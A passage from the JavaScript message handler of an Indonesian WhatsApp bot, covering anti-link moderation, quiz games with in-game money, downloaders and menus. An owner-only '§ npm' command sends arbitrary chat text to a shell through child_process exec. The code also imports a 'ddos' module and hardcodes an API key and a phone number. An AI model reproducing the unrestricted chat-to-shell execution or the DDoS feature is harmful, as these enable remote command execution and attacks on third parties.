        if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link Tiktok Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
RyuuBotz.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan tiktok di grup ini\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://x.com/")){
        if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link twitter Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link twitter Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
RyuuBotz.sendMessage(from, {text:`\`\`\`「 Twitter/X Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah di kick karena mengirim tautan twitter di grup ini\n> MELANGGAR 3X ADMIN BAKAL NGEKICK😹`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

RyuuBotz.family100 = RyuuBotz.family100 ? RyuuBotz.family100 : {};
if (from in RyuuBotz.family100 && !m.key.fromMe ) {
    let similarity = require('similarity');
    let threshold = 0.72; // semakin tinggi nilai, semakin mirip
    let id = m.chat;
    let users = global.db.users[m.sender];
    let room = RyuuBotz.family100[id];
    let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '');
    let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy);

    if (!isSurrender) {
        let index = room.jawaban.indexOf(text);

        if (index < 0) {
            if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) {
                return replyReinzID('Dikit lagi!');
            }
        }

        if (!isCmd && room.terjawab[index]) {
            return;
        }

        users.money += room.winScore;
        room.terjawab[index] = m.sender;
    }

    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length;

    let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
    return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0] : ''}`.trim() : false;
}).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
    `.trim();

    RyuuBotz.sendMessage(from, { text: `${caption}`, mentions: [room.terjawab + '@s.whatsapp.net'] }, { quoted: m }).then(msg => {
        RyuuBotz.family100[id].msg = msg;
    }).catch(_ => _);

    if (isWin || isSurrender) {
        delete RyuuBotz.family100[id];
    }
}
RyuuBotz.tebaklagu = RyuuBotz.tebaklagu ? RyuuBotz.tebaklagu : {};
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   RyuuBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

RyuuBotz.tebakkata = RyuuBotz.tebakkata ? RyuuBotz.tebakkata : {}  
if (from in RyuuBotz.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(RyuuBotz.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n`
 replyReinzID(`${teks}`)
 clearTimeout(RyuuBotz.tebakkata[id][2])
 delete RyuuBotz.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}
RyuuBotz.tebakgambar = RyuuBotz.tebakgambar ? RyuuBotz.tebakgambar : {} 
if(from in RyuuBotz.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(RyuuBotz.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n\nIngin bermain lagi? Silahkan Ketik TebakGambar`
 replyReinzID(`${teks}`)
 clearTimeout(RyuuBotz.tebakgambar[id][3])
 delete RyuuBotz.tebakgambar[id]
} else console.log('*Jawaban Salah!*')
}

RyuuBotz.tebakbendera2 = RyuuBotz.tebakbendera2 ? RyuuBotz.tebakbendera2 : {};
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera2[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyReinzID('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await RyuuBotz.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
RyuuBotz.tebakbendera = RyuuBotz.tebakbendera ? RyuuBotz.tebakbendera : {};
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyReinzID('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await RyuuBotz.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
RyuuBotz.tebakkabupaten = RyuuBotz.tebakkabupaten ? RyuuBotz.tebakkabupaten : {};
 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyReinzID('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await RyuuBotz.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
 RyuuBotz.tebakkimia = RyuuBotz.tebakkimia ? RyuuBotz.tebakkimia : {};
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyReinzID('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await RyuuBotz.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
        
//=========================================\\
RyuuBotz.tekateki = RyuuBotz.tekateki ? RyuuBotz.tekateki : {}  
if(from in RyuuBotz.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(RyuuBotz.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += RyuuBotz.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${RyuuBotz.tekateki[id][2]} Money 💸`
 replyReinzID(`${teks}`)
 clearTimeout(RyuuBotz.tekateki[id][3])
 delete RyuuBotz.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyReinzID(`*Dikit Lagi!*`)
}
//=========================================\\
RyuuBotz.tebakasahotak = RyuuBotz.tebakasahotak ? RyuuBotz.tebakasahotak : {};
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyReinzID('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await RyuuBotz.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
//=========================================\\
        RyuuBotz.siapaaku = RyuuBotz.siapaaku ? RyuuBotz.siapaaku : {}
if(from in RyuuBotz.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(RyuuBotz.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += RyuuBotz.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${RyuuBotz.siapaaku[id][2]} Money 💸`
   replyReinzID(`${teks}`)
 clearTimeout(RyuuBotz.siapaaku[id][3])
 delete RyuuBotz.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyReinzID(`*Dikit Lagi!*`)
// else reply(`*Salah!*`) 
}
//=========================================\\
        RyuuBotz.susunkata = RyuuBotz.susunkata ? RyuuBotz.susunkata : {}  
if(from in RyuuBotz.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(RyuuBotz.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += RyuuBotz.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${RyuuBotz.susunkata[id][2]} Money 💸`
replyReinzID(`${teks}`)
 clearTimeout(RyuuBotz.susunkata[id][3])
 delete RyuuBotz.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyReinzID(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 
}
//=========================================\\
RyuuBotz.caklontong = RyuuBotz.caklontong ? RyuuBotz.caklontong : {};
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 RyuuBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
RyuuBotz.tebakkalimat = RyuuBotz.tebakkalimat ? RyuuBotz.tebakkalimat : {};
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 RyuuBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

//=========================================//
RyuuBotz.tebaklirik = RyuuBotz.tebaklirik ? RyuuBotz.tebaklirik : {}  
if(from in RyuuBotz.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(RyuuBotz.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.money += RyuuBotz.tebaklirik[id][2]
 global.db.users[m.sender].exp += 10
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${RyuuBotz.tebaklirik[id][2]} Money 💸\n EXP: +10`
  replyReinzID(`${teks}`)
 clearTimeout(RyuuBotz.tebaklirik[id][3])
 delete RyuuBotz.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyReinzID(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 }
//=========================================\\
RyuuBotz.tebaktebakan = RyuuBotz.tebaktebakan ? RyuuBotz.tebaktebakan : {};
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 RyuuBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
//antilink all by reinz
if (AntiLinkAll)
   if (budy.includes("https://") || budy.includes("wa.me") || budy.includes("whatsapp.com") || budy.includes("Wa.me")){
           if (isAdmins) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link All Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (isRyuuTheCreator) return RyuuBotz.sendMessage(m.chat, {text: `\`\`\`「 Link All Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await RyuuBotz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
RyuuBotz.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//ANTILINK JB
//antilink all by reinz

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
RyuuBotz.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}
//respon npm
if (body.startsWith('§ npm')) {
  if (!isRyuuTheCreator) return reply('Perintah ini hanya bisa digunakan oleh Ryuu sang Creator!');

  let commandBash = body.slice(2).trim();
  if (!commandBash) return reply('Contoh: § npm audit');

  await reply(`🕒 Menjalankan perintah:\n\`\`\`${commandBash}\`\`\``);

  try {
    const { exec } = require('child_process');
    exec(commandBash, (err, stdout, stderr) => {
      const errorMsg = err?.message || '';
      const hasOutput = stdout?.length > 0;
      const hasStderr = stderr?.length > 0;

      if (!hasOutput && !hasStderr) {
        return reply(`⚠️ Tidak ada output yang diberikan.`);
      }

      let finalText = '';
      if (errorMsg) finalText += `❌ Error:\n\`\`\`${errorMsg.trim()}\`\`\`\n`;
      if (hasStderr) finalText += `⚠️ Stderr:\n\`\`\`${stderr.trim()}\`\`\`\n`;
      if (hasOutput) finalText += `✅ Output:\n\`\`\`${stdout.trim()}\`\`\``;

      if (finalText.length > 3000) {
        reply(`✅ Output terlalu panjang, dikirim sebagai dokumen.`);
        return RyuuBotz.sendMessage(m.chat, {
          document: Buffer.from(finalText),
          fileName: 'output.txt',
          mimetype: 'text/plain',
          caption: '📄 Output dari perintah shell'
        }, { quoted: m });
      }

      reply(finalText.trim());
    });
  } catch (e) {
    reply(`❌ Gagal menjalankan perintah:\n${e}`);
  }
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: RyuuBotz.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, RyuuBotz.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
RyuuBotz.ev.emit('messages.upsert', msg)
}
const { ytmp3, ytmp4, yytmp3, yytmp4 } = require('./command/ytdownloader')
const tts = require('./command/tts')
const { handleSuitCommand, handleSuitAnswer } = require('./command/suitpvp')
        //Suit PvP
        handleSuitAnswer(m, { RyuuBotz, replyReinzID, botNumber })
         //end
const { addweb, delweb, listweb, gethtml } = require('./command/webDevelopment')
const ddos = require('./command/ddos');
const menfess = require('./command/menfess');
const stalker = require('./command/stalker');

switch (command) {
case 'arisubot': {
  if (!isRyuuTheCreator) return reply('❌ Hanya Owner yang bisa pakai perintah ini!')

  if (!args[0]) return reply(`*Contoh:* ${prefix + command} on/off`)

  if (args[0].toLowerCase() === 'on') {
    global.ArisuBot = true
    reply('✅ ArisuBot sekarang *AKTIF* ✅')
  } else if (args[0].toLowerCase() === 'off') {
    global.ArisuBot = false
    reply('✅ ArisuBot sekarang *NON-AKTIF* ❌')
  } else {
    reply(`❗ Pilihan hanya *on* atau *off*`)
  }
}
break
case 'imgedit': {
  if (!m.quoted || !/image/.test(m.quoted.mimetype))
    return reply(`Balas gambar dengan caption *${usedPrefix + command} <teks>*`);

  const FormData = require('form-data');
  const form = new FormData();
  form.append('file', qimg, 'image.jpg');

  try {
    const res = await axios.post('https://api.aceimg.com/api/upload', form, {
      headers: { ...form.getHeaders() }
    });

    const dataUpload = res.data;
    if (!dataUpload.status || !dataUpload.link) 
      return reply(`⚠️ Upload gagal, coba lagi nanti.`);

    const match = dataUpload.link.match(/f=([^\s]+)/);
    const filename = match ? match[1] : null;
    const cdnLink = filename ? `https://cdn.aceimg.com/${filename}` : dataUpload.link;

    await RyuuBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });

    const { data } = await axios.post('https://api.botcahx.eu.org/api/maker/imgedit', {
      text: text,
      url: cdnLink,
      apikey: 'nIxedmID'
    });

    await RyuuBotz.sendFile(m.chat, data.result, 'imgedit.jpg', `✨ Ini hasilnya yaa~`, m);

  } catch (e) {
    console.error(e);
    await RyuuBotz.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    reply(`⚠️ Terjadi kesalahan, coba lagi nanti.\n*Error:* ${e.message}`);
    }
  }
  break;
case 'otakudesu': {
  const otakudesu = require('./command/otakudesu')
  otakudesu(m, RyuuBotz)
}
break;
case 'gethtml': {
      const getHtml = require('./command/getHtml')
  getHtml(m, RyuuBotz, text, prefix, replyryuu)
}
break
case 'play':
case 'ytplay': {
const ytplay = require('./command/play')
  ytplay(m, RyuuBotz, text, prefix, reply, ucapanWaktu);
  }
  break;
case 'ytmp3': {
//const ytmp3 = require('./command/ytdownloader')
 ytmp3(m, RyuuBotz, text, prefix, reply);
 } 
break;
case 'ytmp4': {
//const ytmp4 = require('./command/ytdownloader')
ytmp4(m, RyuuBotz, text, prefix, reply);
}
 break;
case 'yytmp3': {
//const yytmp3 = require('./command/ytdownloader')
yytmp3(m, RyuuBotz, text, prefix, reply); 
}
break;
case 'yytmp4': {
//const yytmp4 = require('./command/ytdownloader')
yytmp4(m, RyuuBotz, text, prefix, reply); 
}
break;
//=====Cooming Soon=====\\
/*case 'stopjadibot': {
if (!isPrem) return replyprem(mess.premium)
stopjadibot(RyuuBotz, m, m.chat)
}
break
case 'jadibot': {
if (!isPrem) return replyprem(mess.premium)
 jadibot(RyuuBotz, m, m.chat)
}
break     
case 'listjadibot': {
if (!isPrem) return reply(mess.premium)
    jadibot(RyuuBotz, m, m.chat)
}
break*/
case 'addweb': {
addweb(m, RyuuBotz, text, prefix, reply, qmsg, isRyuuTheCreator, mess, example); }
break;
case 'delweb': {
delweb(m, RyuuBotz, text, reply, isRyuuTheCreator, mess); }
break;
case 'listweb': {
listweb(m, reply, isRyuuTheCreator, mess); }
break;
case 'scweb':
case 'gethtml': {
gethtml(m, RyuuBotz, text, reply, isRyuuTheCreator, mess); 
}
break;
case 'ttc':
case 'ttt':
case 'tictactoe': {
const tictactoe = require('./command/tictactoe')
  this.game = await tictactoe(m, RyuuBotz, text, prefix, command, replyReinzID, parseMention, this.game || {});
  }
  break;
case 'delttc':
case 'delttt': {
const delttc = require('./command/tictactoe')
  this.game = delttc(m, RyuuBotz, replyReinzID, this.game || {});
  }
  break;
case 'suitpvp':
case 'rps':
case 'rockpaperscissors':
case 'suit': {
  handleSuitCommand(m, { RyuuBotz, text, replyReinzID, owner, prefix })
}
break
	case 'public': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
RyuuBotz.public = true
replyReinzID('*Berhasil Mengubah Ke Penggunaan Publik*')
            }
            break
            case 'self': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
RyuuBotz.public = false
replyReinzID('*Sukses Berubah Menjadi Pemakaian Sendiri*')
            }
            break
case 'tts2':
case 'ttsba':
case 'tts-blue-archive': {
  return tts.tts2(m, { text, RyuuBotz, replyryuu })
  }
  break;
case 'tts3': {
  return tts.tts3(m, { text, RyuuBotz, reply })
  }
  break;
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replyReinzID(`Kirim/reply Gambar Dengan Caption ${prefix + command}
 text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
RyuuBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
memek = await RyuuBotz.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
RyuuBotz.sendMessage(m.chat, { react: { text: '✔️', key: m.key }})
} else {
replyReinzID(`Kirim/reply Gambar Dengan Caption ${prefix + command}
 text1|text2`)
}
}
break
case 'jadibot': {
     replyReinzID('fitur ini tersedia di next update')
}
break     
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(RyuuBotz => RyuuBotz.user).map(RyuuBotz => RyuuBotz.user)])]
te = "*Rentbot List*\n\n"
for (let i of user){
y = await RyuuBotz.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
RyuuBotz.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replyReinzID(`Belum ada pengguna yang menyewa bot`)
}
break
case 'clearall': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
RyuuBotz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
RyuuBotz.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
RyuuBotz.chatModify({ pin: false }, m.chat)
}
break
case 'restart':
if (!isRyuuTheCreator) return reply(mess.only.owner)
replyReinzID(`restarting ${global.botname}`)
replyReinzID(`Done ✅`)
await sleep(3000)
process.exit()
break
case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            replyReinzID(`hallo kak ${pushname}
jadi ${botname} memiliki total fitur ${ReinzIDtotalpitur()}
bantu support dan donasinya biar fitur nya 
tambah banyak yaa..... terimakasih.🔥🔥`)
        break
case 'owner': {
try {
    const vcard = `
BEGIN:VCARD
VERSION:3.0
FN:Ryuu Reinzz
ORG:The Developer Of Arisu AI;
TEL;type=CELL;type=VOICE;waid=6288246552068:+62-882-4655-2068
END:VCARD
    `.trim()

    await RyuuBotz.sendMessage(m.chat, {
      contacts: {
        displayName: "Ryuu Reinzz",
        contacts: [{ vcard }]
      },
      contextInfo: {
        externalAdReply: {
          title: "WhatsApp Business • Store",
          body: "The Developer Of Arisu AI",
          thumbnailUrl: '' + global.thumbnail,
          sourceUrl: 'https://wa.me/6288246552068',
          mediaUrl: 'https://linkbio.co',
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    })

    reply(`Semua transaksi di luar command \`.owner\` tidak di tanggung oleh developer asli *Ryuu Reinzz*, jika ada pembelian di luar command \`.owner\`, developer tidak bertanggungjawab atas apa yang terjadi`);
  } catch (e) {
    await RyuuBotz.sendMessage(m.chat, {
      text: typeof e === 'string' ? e : '🚫 *Terjadi kesalahan saat memproses permintaan.*',
      quoted: m
    });
  } finally {
    await RyuuBotz.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
  }
  }
  break;
case 'simulating': {
  const simulating = require('./command/simulating')
  simulating(m, { RyuuBotz, args, isBotAdmins, isAdmins, reply, mess, replyryuu })
}
break
 case 'menu': {
  RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  const kosong = global.kosong
	          let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let uptime = await runtime(process.uptime())
            let timestampe = speed()
            let latensie = speed() - timestampe
            ReinzID_sad = `*Konnichiwa ${pushname}!*  
Aku adalah *${botname}*, asisten virtual yang siap membantumu 💫

Bot ini dirancang untuk mendukung berbagai kebutuhanmu — mulai dari menjaga grup, mengunduh media, belajar, hiburan, hingga fitur-fitur seru yang bikin hari-harimu jadi lebih mudah dan menyenangkan 🧠🎮

👤 *ᴄʀᴇᴀᴛᴏʀ:* ${global.nameCreator}  
Jika mengalami kendala atau butuh bantuan, silakan ketik *.owner* untuk menghubungi developer langsung.
${kosong}
╭─⌈ *𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍* ⌋
│◦ ɴᴀᴍᴀ : *${pushname}*
│◦ sᴛᴀᴛᴜs : *${isPrem ? 'ᴘʀᴇᴍɪᴜᴍ ✓' : 'ғʀᴇᴇ 𝕏'}*
│◦ ɴᴏᴍᴏʀ : ${m.sender.split("@")[0]}
╰─────────────

╭─⌈ *𝙊𝙒𝙉𝙀𝙍 𝙄𝙉𝙁𝙊* ⌋
│𖥔 ᴄʀᴇᴀᴛᴏʀ : ${ownername}
│𖥔 ɴᴀᴍᴀ ʙᴏᴛ : ${botname}
│𖥔 ᴠᴇʀsɪ : 0.0.5
│𖥔 ᴛʏᴘᴇ : ᴄᴀsᴇ
│𖥔 ɪɴsᴛᴀɢʀᴀᴍ : ${ig}
│𖥔 ᴡʜᴀᴛsᴀᴘᴘ : ${ownernumber}
╰─────────────

╭─⌈ *𝘽𝙊𝙏 𝙎𝙏𝘼𝙏𝙐𝙎* ⌋
│◦ ɴᴀᴍᴀ : *${botname}*
│◦ ʀᴜɴᴛɪᴍᴇ : *${runtime(process.uptime())}*
│◦ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownername}*
│◦ ᴍᴏᴅᴇ : *${RyuuBotz.public ? 'Public' : 'Self'}*
│◦ ᴘᴇɴɢɢᴜɴᴀ : *${Object.keys(global.db.users).length}*
╰─────────────
${kosong}
📋 *Menu Utama*  
• .update  
• .bacaperaturan  
• .donasi  
• .allmenu  
• .aimenu  
• .funmenu  
• .rpggame  
• .pushmenu  
• .nsfwmenu  
• .gamemenu  
• .storemenu  
• .animemenu  
• .othermenu  
• .ownermenu  
• .groupmenu  
• .islamimenu  
• .beritamenu  
• .quotesmenu  
• .stickermenu  
• .stalkermenu  
• .primbonmenu  
• .sertifikatmenu  
• .downloadmenu  
• .newupdatemenu  
• .ephoto360menu  
• .anonymousmenu  
• .randomvideomenu  
• .randomphotomenu  

📌 *Shortcut Menu*  
➤ Ketik: \`.menuv1\` atau \`reinzmenu\`  
➤ Untuk semua fitur: \`.allmenu\`  

❗ *Jangan lupa gabung ke grup bot* untuk update dan info penting kalau sewaktu-waktu bot mengalami error atau banned.

━━━━━━━  
© *Ryuu Reinzz*`
RyuuBotz.sendMessage(m.chat, {
      video: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumbvid.mp4'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
